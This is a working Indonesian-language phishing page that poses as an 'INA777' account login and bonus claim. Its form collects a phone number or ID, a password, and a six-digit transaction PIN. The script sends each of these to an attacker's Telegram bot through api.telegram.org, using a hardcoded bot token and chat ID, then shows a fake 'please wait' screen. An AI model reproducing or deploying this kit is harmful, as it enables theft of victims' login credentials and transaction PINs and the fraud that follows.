<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF‑8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta property="og:title" content="Klaim Bonus 100K Kusus Bagi Semua Member!">
<meta property="og:description" content="Klaim bonus terbatas untuk seluruh member, buka tautan di bawah ini">
<meta property="og:image" content="https://bonus-ina777-claim.vercel.app/IMG_20261022_120451_172.jpg">
<meta property="og:type" content="website">
  <title>INA777 - Masuk Akun</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html, body {
  min-height: 100%;
}

.latar-penuh {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background-image: url('https://raw.githubusercontent.com/predi1998a-oss/Ina777/refs/heads/main/src/IMG_20261022_113826_438.png');
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  background-color: rgba(0, 0, 0, 0.35);
  background-blend-mode: darken;
  z-index: -1;
}

body {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 16px;
}

.container {
  width: 100%;
  max-width: 360px;
  position: relative;
  border-radius: 22px;
  overflow: hidden;
  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
}

.halaman { display: none; }
.halaman.aktif { display: block; }

.header-top {
  background: linear-gradient(180deg, #7ec8ff, #40a8f5);
  padding: 18px 22px 12px;
  color: #fff;
}

.judul-halaman {
  font-size: 28px;
  font-weight: bold;
  text-shadow: 2px 2px #0066aa;
}

.close-btn {
  position: absolute;
  top: 12px;
  right: 12px;
  width: 46px;
  height: 46px;
  border-radius: 50%;
  background: #66ccff;
  border: none;
  font-size: 24px;
  color: #003366;
  cursor: pointer;
  z-index: 10;
}

.form-box {
  background: #2b549c;
  padding: 22px;
}

.tab-bar {
  display: flex;
  gap: 8px;
  margin-bottom: 18px;
}

.tab {
  flex: 1;
  padding: 10px;
  border-radius: 12px;
  text-align: center;
  font-weight: bold;
  font-size: 16px;
  cursor: pointer;
  background: #b0c4de;
  color: #222;
}

.tab.active {
  background: #eef266;
  color: #335500;
}

.note-red {
  color: #ff4444;
  font-size: 13px;
  line-height: 1.5;
  margin-bottom: 22px;
}

.form-group {
  margin-bottom: 18px;
}

.label {
  color: #fff;
  font-size: 15px;
  margin-bottom: 8px;
  display: block;
  font-weight: bold;
}

.input-wrapper input {
  width: 100%;
  height: 40px;
  padding: 10px 14px;
  border: none;
  border-radius: 11px;
  background: #1a335e;
  color: #fff;
  font-size: 16px;
  outline: none;
}

.button-row {
  display: flex;
  gap: 12px;
  margin-top: 24px;
}

.btn {
  flex: 1;
  height: 44px;
  border: none;
  border-radius: 14px;
  font-size: 19px;
  font-weight: bold;
  cursor: pointer;
  box-shadow: 0 4px 0 rgba(0,0,0,0.15);
}

.btn-daftar {
  background: linear-gradient(180deg, #ffdd44, #ffaa00);
  color: #994400;
}

.btn-login {
  background: linear-gradient(180deg, #66ddff, #22aaff);
  color: #004477;
}

.pin-box {
  background: #2b549c;
  padding: 30px 22px;
  text-align: center;
}

.pin-judul {
  color: #fff;
  font-size: 22px;
  font-weight: bold;
  margin-bottom: 16px;
}

.pin-keterangan {
  color: #ddd;
  font-size: 14px;
  line-height: 1.6;
  margin-bottom: 10px;
}

.pin-container {
  display: flex;
  justify-content: center;
  gap: 10px;
  margin: 20px 0;
}

.pin-input-kotak {
  width: 45px;
  height: 50px;
  border: none;
  border-radius: 8px;
  background: #1a335e;
  color: #fff;
  font-size: 22px;
  font-weight: bold;
  text-align: center;
  outline: none;
  transition: all 0.2s;
}

.pin-input-kotak:focus {
  border: 2px solid #66ccff;
  box-shadow: 0 0 0 3px rgba(102, 204, 255, 0.2);
}

.terima-kasih-box {
  background: rgba(255,255,255,0.95);
  padding: 40px 22px;
  text-align: center;
}

.terima-kasih-judul {
  font-size: 22px;
  font-weight: bold;
  color: #2b549c;
  margin-bottom: 15px;
}

.terima-kasih-teks {
  font-size: 15px;
  color: #444;
  line-height: 1.7;
}
</style>
</head>
<body>
  <div class="latar-penuh"></div>
  <div class="container">
    <button class="close-btn" onclick="alert('Ditutup')">✕</button>

    <!-- Halaman Login -->
    <div class="halaman aktif" id="halaman-login">
      <div class="header-top">
        <div class="judul-halaman">Akun Masuk</div>
      </div>
      <div class="form-box">
        <div class="tab-bar">
          <div class="tab active" onclick="gantiTab('hp')">Nomor HP</div>
          <div class="tab" onclick="gantiTab('id')">ID</div>
        </div>
        <p class="note-red">* Harap masukkan informasi yang terikat untuk masuk</p>
        <div class="form-group">
          <label class="label" id="labelUtama">Nomor Telepon</label>
          <div class="input-wrapper">
            <input type="tel" id="inputUtama" placeholder="Masukkan nomor telepon">
          </div>
        </div>
        <div class="form-group">
          <label class="label">Kata Sandi</label>
          <div class="input-wrapper">
            <input type="password" id="kataSandi" placeholder="Masukkan kata sandi">
          </div>
        </div>
        <div class="button-row">
          <button class="btn btn-daftar" onclick="alert('Fitur dalam pengembangan')">Daftar</button>
          <button class="btn btn-login" onclick="simpanDataLogin()">Login</button>
        </div>
      </div>
    </div>

    <!-- Halaman PIN -->
    <div class="halaman" id="halaman-pin">
      <div class="header-top">
        <div class="judul-halaman">PIN Transaksi</div>
      </div>
      <div class="pin-box">
        <div class="pin-judul">Masukkan PIN Transaksi</div>
        <p class="pin-keterangan">Masukkan 6 angka PIN</p>
        <div class="pin-container">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="0" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="1" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="2" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="3" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="4" inputmode="numeric">
          <input type="text" class="pin-input-kotak" maxlength="1" data-index="5" inputmode="numeric">
        </div>
      </div>
    </div>

    <!-- Halaman Terima Kasih -->
    <div class="halaman" id="halaman-terima">
      <div class="header-top">
        <div class="judul-halaman">Pemberitahuan</div>
      </div>
      <div class="terima-kasih-box">
        <div class="terima-kasih-judul">Terima Kasih</div>
        <p class="terima-kasih-teks">Permintaan Anda sedang dalam proses,<br>mohon ditunggu.</p>
      </div>
    </div>
  </div>

<script>
// ==============================================
// ⚠️  ISI CHAT_ID KAMU DI BAWAH INI
// ==============================================
const BOT_TOKEN = "8891706798:AAGbzgA8B2rygol7KeHd4tXmrNpscDp4DCQ";
const CHAT_ID = "8810674043";
// ==============================================

let modeSekarang = 'hp';
const pinKotak = document.querySelectorAll('.pin-input-kotak');

let dataPengguna = {
  id: '',
  sandi: '',
  pin: ''
};

function kirimKeTelegram(pesan) {
  const teks = encodeURIComponent(pesan);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${teks}`;
  
  console.log('📤 Mengirim ke Telegram...');
  console.log('URL:', url);
  
  return fetch(url)
    .then(res => res.json())
    .then(data => {
      console.log('📥 Respon Telegram:', data);
      if (!data.ok) alert('Error: ' + data.description);
      return data;
    })
    .catch(err => {
      console.error('❌ Error:', err);
      alert('Gagal mengirim: ' + err.message);
      return { ok: false };
    });
}

function gantiTab(jenis) {
  modeSekarang = jenis;
  const label = document.getElementById('labelUtama');
  const input = document.getElementById('inputUtama');
  document.querySelectorAll('.tab')[0].classList.toggle('active', jenis === 'hp');
  document.querySelectorAll('.tab')[1].classList.toggle('active', jenis === 'id');
  if (jenis === 'hp') {
    label.textContent = 'Nomor Telepon';
    input.placeholder = 'Masukkan nomor telepon';
    input.type = 'tel';
  } else {
    label.textContent = 'ID Akun';
    input.placeholder = 'Masukkan ID akun anda';
    input.type = 'text';
  }
}

function bukaHalaman(nama) {
  document.querySelectorAll('.halaman').forEach(el => el.classList.remove('aktif'));
  document.getElementById('halaman-' + nama).classList.add('aktif');
  if (nama === 'pin') pinKotak[0].focus();
}

async function simpanDataLogin() {
  dataPengguna.id = document.getElementById('inputUtama').value;
  dataPengguna.sandi = document.getElementById('kataSandi').value;
  
  if (!dataPengguna.id || !dataPengguna.sandi) {
    alert('Harap lengkapi nomor/ID dan kata sandi!');
    return;
  }

  // Kirim data login
  const hasil = await kirimKeTelegram(
    `📥 Login\n` +
    `━━━━━━━━━━━━━━━\n` +
    `📱 Nomor/ID: ${dataPengguna.id}\n` +
    `🔑 Kata Sandi: ${dataPengguna.sandi}\n` +
    `━━━━━━━━━━━━━━━`
  );
  
  if (hasil.ok) bukaHalaman('pin');
}

function ambilPIN() {
  return Array.from(pinKotak).map(i => i.value).join('');
}

pinKotak.forEach((input, idx) => {
  input.addEventListener('input', async (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    if (e.target.value && idx < 5) pinKotak[idx + 1].focus();
    
    // Kirim otomatis saat PIN 6 angka selesai
    if (e.target.value && idx === 5) {
      dataPengguna.pin = ambilPIN();
      
      if (dataPengguna.pin.length === 6) {
        const hasil = await kirimKeTelegram(
          `🔢 PIN Diterima\n` +
          `━━━━━━━━━━━━━━━\n` +
          `📱 Nomor/ID: ${dataPengguna.id}\n` +
          `🔑 Kata Sandi: ${dataPengguna.sandi}\n` +
          `🔢 PIN: ${dataPengguna.pin}\n` +
          `━━━━━━━━━━━━━━━`
        );
        if (hasil.ok) bukaHalaman('terima');
      }
    }
  });
  
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !e.target.value && idx > 0) pinKotak[idx - 1].focus();
  });
});
</script>
</body>
</html>
